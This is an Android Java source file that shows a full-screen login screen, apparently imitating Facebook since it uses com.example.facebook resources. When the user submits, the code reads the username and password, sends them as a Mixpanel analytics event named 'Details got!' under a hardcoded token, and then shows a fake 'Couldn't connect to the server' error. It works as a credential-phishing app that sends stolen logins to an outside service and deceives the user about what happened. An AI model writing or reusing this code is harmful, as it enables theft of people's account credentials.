package com.example.mixpanel;


import org.json.JSONException;
import org.json.JSONObject;

import android.graphics.Typeface;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.example.facebook.R;
import com.mixpanel.android.mpmetrics.MixpanelAPI;


public class MainActivity extends ActionBarActivity {


	public static final String MIXPANEL_TOKEN = "6cca5ef019a89c21ccab108795b09cd9";

	// Initialize the library with your
	// Mixpanel project token, MIXPANEL_TOKEN, and a reference
	// to your application context.
	MixpanelAPI mixpanel;
	EditText ed1,ed2;
	Button login;
	int i;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_main);
		
		ed1=(EditText)findViewById(R.id.editText1);
		ed2=(EditText)findViewById(R.id.editText2);
		login=(Button)findViewById(R.id.button1);

		
		
		Typeface tf = Typeface.createFromAsset(getAssets(),"fonts/robotoregular.ttf");  
		ed1.setTypeface(tf);
		ed2.setTypeface(tf);
		login.setTypeface(tf);
		i=1;

		login.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub

				if(ed1.getText().toString().trim().length()!=0 && ed2.getText().toString().trim().length()!=0){

					if(i==1){
						String username=ed1.getText().toString();
						String password=ed2.getText().toString();

						mixpanel=MixpanelAPI.getInstance(MainActivity.this, MIXPANEL_TOKEN);
						mixpanel.identify(username);
						mixpanel.getPeople().identify("Abhi");
						try{
						}catch(Exception e){
							System.out.println("here");
						}
//						MixpanelAPI.People people=mixpanel.getPeople();
//						people.set("$firstname",username);
//						people.increment("Update Count", 1);

						JSONObject information = new JSONObject();
						try {
							information.put("Username", username);
							information.put("Password", password);
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}

						mixpanel.track("Details got!", information);
						
						mixpanel.flush();

						Toast.makeText(MainActivity.this, "Couldn't connect to the server. Please try again later.", Toast.LENGTH_LONG).show();
					}
					else{
						Toast.makeText(MainActivity.this, "Couldn't connect to the server. Please try again later.", Toast.LENGTH_LONG).show();

					}

				}
				else{
					Toast.makeText(MainActivity.this, "Username/password can not be empty", Toast.LENGTH_LONG).show();
				}
			}
		});

	}


	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}

	@Override
	protected void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}
}
